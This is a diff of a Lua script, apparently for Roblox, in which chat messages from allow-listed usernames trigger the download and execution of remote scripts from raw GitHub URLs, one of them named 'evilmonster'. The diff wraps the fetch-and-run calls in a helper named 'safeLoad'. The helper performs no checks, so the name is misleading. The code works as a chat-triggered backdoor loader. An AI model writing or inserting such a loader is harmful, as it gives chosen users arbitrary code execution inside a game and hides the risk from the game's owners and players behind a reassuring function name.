@@ -9,19 +9,27 @@ local allowed = {
 	["koolguy1234513"] = true
 }
 
+local function safeLoad(url)
+	local source = game:HttpGet(url)
+	local func = loadstring(source)
+	if func then
+		func()
+	end
+end
+
 local function runCommand(msg)
 	if typeof(msg) ~= "string" then
 		return
 	end
 	local m = string.lower(msg)
 	if string.find(m, "shy", 1, true) then
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/Breadcrumbzes/Hey/main/shy%20guy"))()
+		safeLoad("https://raw.githubusercontent.com/Breadcrumbzes/Hey/main/shy%20guy")
 	elseif string.find(m, "san", 1, true) then
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/Breadcrumbzes/Hey/main/sand"))()
+		safeLoad("https://raw.githubusercontent.com/Breadcrumbzes/Hey/main/sand")
 	elseif string.find(m, "test", 1, true) then
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/Breadcrumbzes/Hey/main/Test"))()
+		safeLoad("https://raw.githubusercontent.com/Breadcrumbzes/Hey/main/Test")
 	elseif string.find(m, "ohno", 1, true) then
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/Breadcrumbzes/Hey/main/evilmonster"))()
+		safeLoad("https://raw.githubusercontent.com/Breadcrumbzes/Hey/main/evilmonster")
 	end
 end
 
